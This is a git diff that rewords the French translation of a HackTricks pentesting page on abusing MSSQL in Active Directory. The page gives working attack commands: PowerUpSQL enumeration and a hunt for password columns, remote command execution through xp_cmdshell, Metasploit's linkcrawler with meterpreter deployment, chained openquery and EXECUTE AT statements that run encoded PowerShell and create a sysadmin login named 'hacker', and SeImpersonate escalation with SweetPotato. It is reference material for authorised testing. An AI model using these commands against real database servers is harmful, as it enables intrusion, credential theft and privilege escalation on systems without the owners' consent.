@@ -1,14 +1,14 @@
-# Abus MSSQL AD
+# Abus de MSSQL AD
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
@@ -40,7 +40,7 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
-Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose 
+Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -51,7 +51,7 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## Abus de base de données MSSQL
+## Utilisation basique de MSSQL
 
 ### Accéder à la base de données
 ```powershell
@@ -65,16 +65,14 @@ Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 ## This won't use trusted SQL links
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
 ```
-### MSSQL RCE
+### RCE MSSQL
 
-Il est peut-être également possible d'**exécuter des commandes** à l'intérieur de l'hôte MSSQL.
+Il pourrait également être possible d'**exécuter des commandes** à l'intérieur de l'hôte MSSQL
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Vérifiez sur la page mentionnée dans la **section suivante comment faire cela manuellement.**
-
-### Astuces de base de piratage MSSQL
+### Astuces de base pour le piratage MSSQL
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
@@ -82,9 +80,9 @@ Vérifiez sur la page mentionnée dans la **section suivante comment faire cela 
 
 ## Liens de confiance MSSQL
 
-Si une instance MSSQL est approuvée (lien de base de données) par une autre instance MSSQL. Si l'utilisateur dispose de privilèges sur la base de données approuvée, il pourra **utiliser la relation de confiance pour exécuter des requêtes également dans l'autre instance**. Ces liens peuvent être enchaînés et à un moment donné, l'utilisateur pourrait être en mesure de trouver une base de données mal configurée où il peut exécuter des commandes.
+Si une instance MSSQL est approuvée (lien de base de données) par une autre instance MSSQL. Si l'utilisateur a des privilèges sur la base de données approuvée, il pourra **utiliser la relation de confiance pour exécuter des requêtes également dans l'autre instance**. Ces liens de confiance peuvent être enchaînés et à un certain point, l'utilisateur pourrait être en mesure de trouver une base de données mal configurée où il peut exécuter des commandes.
 
-**Les liens entre les bases de données fonctionnent même à travers les relations de forêt.**
+**Les liens entre les bases de données fonctionnent même à travers les confiances inter-forêts.**
 
 ### Abus de Powershell
 ```powershell
@@ -126,30 +124,32 @@ Vous pouvez facilement vérifier les liens de confiance en utilisant Metasploit.
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Notez que Metasploit essaiera d'exploiter uniquement la fonction `openquery()` dans MSSQL (donc, si vous ne pouvez pas exécuter de commande avec `openquery()`, vous devrez essayer la méthode `EXECUTE` **manuellement** pour exécuter des commandes, voir plus bas.)
+Noticez que Metasploit essaiera d'exploiter uniquement la fonction `openquery()` dans MSSQL (donc, si vous ne pouvez pas exécuter de commande avec `openquery()`, vous devrez essayer la méthode `EXECUTE` **manuellement** pour exécuter des commandes, voir plus ci-dessous.)
 
 ### Manuel - Openquery()
 
-Depuis **Linux**, vous pouvez obtenir une console shell MSSQL avec **sqsh** et **mssqlclient.py.**
+Depuis **Linux**, vous pourriez obtenir un shell de console MSSQL avec **sqsh** et **mssqlclient.py.**
 
-Depuis **Windows**, vous pouvez également trouver les liens et exécuter des commandes manuellement en utilisant un **client MSSQL comme** [**HeidiSQL**](https://www.heidisql.com)
+Depuis **Windows**, vous pourriez également trouver les liens et exécuter des commandes manuellement en utilisant un **client MSSQL tel que** [**HeidiSQL**](https://www.heidisql.com)
 
 _Connexion en utilisant l'authentification Windows:_
 
-![](<../../.gitbook/assets/image (167) (1).png>)
+![](<../../.gitbook/assets/image (167) (1).png>) 
 
 #### Trouver des liens de confiance
 ```sql
 select * from master..sysservers
 ```
+![](<../../.gitbook/assets/image (168).png>)
+
 #### Exécuter des requêtes dans un lien de confiance
 
-Exécutez des requêtes via le lien (par exemple : trouvez plus de liens dans la nouvelle instance accessible) :
+Exécuter des requêtes via le lien (exemple : trouver plus de liens dans la nouvelle instance accessible) :
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Vérifiez où les guillemets simples et doubles sont utilisés, il est important de les utiliser de cette manière.
+Vérifiez où les guillemets doubles et simples sont utilisés, il est important de les utiliser de cette manière.
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (169).png>)
@@ -162,8 +162,6 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Si vous ne pouvez pas effectuer des actions telles que `exec xp_cmdshell` depuis `openquery()`, essayez avec la méthode `EXECUTE`.
-
 ### Manuel - EXECUTE
 
 Vous pouvez également abuser des liens de confiance en utilisant `EXECUTE`:
@@ -172,10 +170,10 @@ Vous pouvez également abuser des liens de confiance en utilisant `EXECUTE`:
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Élévation de privilèges locaux
+## Élévation locale des privilèges
 
-L'utilisateur local **MSSQL** a généralement un type de privilège spécial appelé **`SeImpersonatePrivilege`**. Cela permet au compte d' "usurper un client après l'authentification".
+L'utilisateur local **MSSQL** a généralement un type de privilège spécial appelé **`SeImpersonatePrivilege`**. Cela permet au compte d' "usurper l'identité d'un client après l'authentification".
 
-Une stratégie que de nombreux auteurs ont élaborée consiste à forcer un service **SYSTEM** à s'authentifier auprès d'un service malveillant ou de l'homme du milieu que l'attaquant crée. Ce service malveillant peut alors usurper le service **SYSTEM** pendant qu'il essaie de s'authentifier.
+Une stratégie que de nombreux auteurs ont développée consiste à forcer un service **SYSTEM** à s'authentifier auprès d'un service malveillant ou de type homme du milieu que l'attaquant crée. Ce service malveillant peut ensuite usurper l'identité du service **SYSTEM** pendant qu'il tente de s'authentifier.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) a une collection de ces différentes techniques qui peuvent être exécutées via la commande `execute-assembly` de Beacon.
+[SweetPotato](https://github.com/CCob/SweetPotato) propose une collection de ces différentes techniques qui peuvent être exécutées via la commande `execute-assembly` de Beacon.
